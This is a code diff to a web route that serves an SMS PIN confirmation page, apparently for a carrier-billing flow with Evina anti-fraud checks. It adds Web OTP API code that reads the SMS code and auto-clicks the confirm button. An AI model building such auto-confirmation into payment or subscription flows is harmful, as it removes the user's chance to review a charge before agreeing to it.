@@ -175,7 +175,7 @@ export async function GET(request: NextRequest) {
     <p class="sub">Enter the PIN sent to <b>${masked}</b></p>
 
     <div class="otp-row" id="otpRow">
-      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off">
+      <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
       <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
       <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
       <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
@@ -235,6 +235,39 @@ export async function GET(request: NextRequest) {
 
     // DOM check
     dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue') + ' EvinaTestCanvas=' + !!document.getElementById('EvinaTestCanvas') + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
+
+    // ── Auto-fetch OTP via Web OTP API ──────────────────────────────────────
+    // Reads incoming SMS automatically. Browser shows a small bottom-sheet
+    // prompt; user taps "allow" once → OTP fills + auto-submits.
+    // Now safe because Evina JS is server-rendered (no more 2501).
+    function fillOTP(code) {
+      var cleaned = code.replace(/\\D/g, '').slice(0, 4);
+      if (cleaned.length < 4) return;
+      for (var i = 0; i < 4; i++) {
+        pins[i].value = cleaned[i] || '';
+      }
+      if (otpValue) otpValue.value = cleaned;
+      dbg('OTP auto-filled: "' + cleaned + '"');
+      updateBtn();
+      // Auto-click confirm after short delay
+      setTimeout(function() { confirmBtn.click(); }, 300);
+    }
+
+    if ('OTPCredential' in window) {
+      dbg('Web OTP API: available — listening for SMS...');
+      navigator.credentials.get({ otp: { transport: ['sms'] } })
+        .then(function(otp) {
+          if (otp && otp.code) {
+            dbg('Web OTP API: received code "' + otp.code + '"');
+            fillOTP(otp.code);
+          }
+        })
+        .catch(function(err) {
+          dbg('Web OTP API: ' + (err.name === 'AbortError' ? 'aborted' : err.message));
+        });
+    } else {
+      dbg('Web OTP API: not available on this device/browser');
+    }
 
     // ── OTP Input handling ──────────────────────────────────────────────────
     function getFullPin() {
